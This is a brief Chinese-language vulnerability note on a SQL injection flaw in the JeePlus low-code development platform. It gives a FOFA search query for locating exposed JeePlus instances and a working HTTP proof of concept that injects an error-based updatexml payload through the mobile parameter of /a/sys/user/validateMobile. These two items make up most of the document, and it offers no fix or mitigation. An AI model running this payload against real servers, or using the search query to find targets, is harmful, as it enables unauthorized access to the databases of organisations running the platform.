## JeePlus低代码开发平台存在SQL注入漏洞

## 一、漏洞简介
JeePlus是一个低代码开发平台，解决了开发中大量的重复工作，让开发者更多聚焦业务逻辑，快速开发和部署现代Web应用程序+微服务架构。JeePlus低代码开发平台存在SQL注入漏洞，SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

## fofa
```
app="JeePlus"
```

## POC
```
GET /a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```
